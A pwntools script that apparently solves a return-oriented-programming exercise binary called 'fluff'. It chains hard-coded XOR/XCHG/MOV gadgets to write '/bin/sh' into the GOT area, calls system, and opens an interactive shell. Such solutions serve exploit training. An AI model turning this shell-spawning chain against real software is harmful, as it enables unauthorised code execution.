from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./fluff')
elf = ELF('./fluff')

p.recvuntil('>')

got_start = 0x601000
xor_r11_r11 = 0x400822
pop_r12 = 0x400832
xor_r11_r12 = 0x40082f
xchg_r11_r10 = 0x400840

payload = flat(['a'*40, xor_r11_r11, 'a'*8, pop_r12, got_start, xor_r11_r12, 'a'*8, xchg_r11_r10, 'a'*8])

payload += flat([xor_r11_r11, 'a'*8, pop_r12, '/bin/sh'.ljust(8,'\x00'), xor_r11_r12, 'a'*8])

mov_r10_r11 = 0x40084e
pop_rdi_ret = 0x4008c3
payload += flat([mov_r10_r11, 'a'*8, 0, pop_rdi_ret, got_start, elf.plt['system']])

p.sendline(payload)

p.interactive()